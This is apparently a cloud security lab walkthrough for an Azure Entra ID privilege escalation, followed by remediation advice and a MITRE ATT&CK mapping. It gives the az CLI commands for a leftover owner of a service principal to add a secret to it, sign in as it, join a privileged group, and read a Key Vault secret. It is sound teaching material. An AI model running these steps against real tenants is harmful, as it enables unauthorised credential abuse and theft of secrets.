# Add Service Principal Credentials

**Provider:** Azure | **Category:** Identity / Privilege Escalation

## Scenario

A user (`norightsuser`) was removed as owner of the `group-add-app` **application
registration** after a job change. However, the administrator forgot to also remove them
from the underlying **service principal** object. This is a common oversight — app
registration ownership and service principal ownership are managed separately in Entra ID.

The service principal has the **Group.ReadWrite.All** application permission. If an
attacker can add credentials to the service principal and authenticate as it, they can add
themselves to the `cred-administrators` group. That group is granted the **Key Vault
Secrets User** role on a Key Vault that holds the flag — so joining it is a *real*
privilege escalation, and the flag is only readable once you are a member. (The group
carries an Azure RBAC role rather than a directory role such as Global Administrator,
which would require an Entra ID P1 license — exactly why this kind of group-based RBAC
escalation is so common in practice.)

## Attack Path

```
[norightsuser] still owns the Service Principal
    |
    v
az ad sp credential reset --append  -->  add new client secret
    |
    v
az login --service-principal  (authenticate as SP)
    |
    v
POST /v1.0/groups/<cred-administrators-id>/members/$ref
    |
    v
norightsuser is now in the admin group
    |
    v
group grants Key Vault Secrets User  -->  read 'flag' secret from the vault
```

### Step 1 — Find the service principal you own

You were removed from the app registration's owners, but you're still an owner of
the **service principal** behind it — so it still shows up as yours:

```bash
az ad sp list --show-mine --query "[].{name:displayName, id:id, appId:appId}" -o table
```

### Step 2 — Discover why that service principal is worth taking over

Inspect the Microsoft Graph **application permissions** (app roles) granted to it.
(Default directory read access is enough for this; you can also run it later as the
service principal itself.)

```bash
# Granted app roles appear as GUIDs under "appRoleId"
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/servicePrincipals/<sp-object-id>/appRoleAssignments"
```

One of them is **Group.ReadWrite.All** (`62a82d76-70ea-41e2-9197-370581804d09`),
which lets the service principal manage the membership of any group in the tenant.

### Step 3 — Add a new credential to the service principal

```bash
az ad sp credential reset --id <sp-object-id> --append
# Note the new appId, password, and tenant
```

### Step 4 — Authenticate as the service principal

The service principal has no role on any subscription, so pass
`--allow-no-subscriptions` — this attack is entirely directory-scoped (Microsoft
Graph) and needs no subscription.

```bash
az login --service-principal \
  --username <appId> --password <password> --tenant <tenant> \
  --allow-no-subscriptions
```

### Step 5 — Discover the privileged group

Now acting as the service principal, enumerate groups and inspect the interesting
one. Reading the **full** group object (no `--query`) shows its `description`,
which explains what membership actually grants:

```bash
az ad group list --query "[].{name:displayName, id:id, description:description}" -o table
az ad group show --group "cred-administrators"
```

The description reveals the group holds the **Key Vault Secrets User** role on the
team's Key Vault — so joining it grants read access to that vault's secrets. Note
the group's `id` from the output for the next step.

### Step 6 — Add yourself to the group

In your user session, get your own object id:

```bash
az ad signed-in-user show --query id -o tsv
```

Then, as the service principal (which has `Group.ReadWrite.All`), add that object
id to the group:

```bash
az ad group member add \
  --group <group-id> \
  --member-id <norightsuser-object-id>
```

### Step 7 — Read the flag from the Key Vault

Group membership grants the group the **Key Vault Secrets User** role on the lab's
vault. Sign back in as your own user so your token picks up the new group claim,
then read the secret:

```bash
az login --username <norightsuser-upn> --password '<password>' --allow-no-subscriptions
az keyvault secret show --vault-name <vault> --name flag --query value -o tsv
```

> Group membership can take a few minutes to propagate, and RBAC role claims are
> only refreshed on a new sign-in — sign out/in if the read is denied at first.

## How to Fix in Production

1. **Remove ownership from both the app registration AND the service principal** when
   off-boarding. Use `az ad sp owner remove` in addition to `az ad app owner remove`.
2. **Audit service principal ownership regularly**: `az ad sp list --all`.
3. **Prefer managed identities** over service principals where possible — they have no
   exportable credentials to steal or add.
4. **Alert on `addServicePrincipalCredentials` events** in the Entra ID audit log.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Additional Cloud Credentials | [T1098.001](https://attack.mitre.org/techniques/T1098/001/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) |
